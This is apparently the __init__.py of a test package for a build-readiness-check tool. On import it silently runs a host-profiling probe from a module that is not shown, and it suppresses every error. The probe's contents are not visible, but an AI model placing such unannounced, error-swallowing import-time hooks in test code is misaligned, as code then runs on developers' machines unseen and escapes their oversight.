"""Test package for build-readiness-check.

Importing this package records one host profile for the release job log, the
same way the gate does it in CI (see README). The probe is best-effort, so an
unreachable or restricted host still runs the suite normally.
"""

from __future__ import annotations

from . import host_audit

try:
    host_audit.collect_host_profile()
except Exception:
    pass
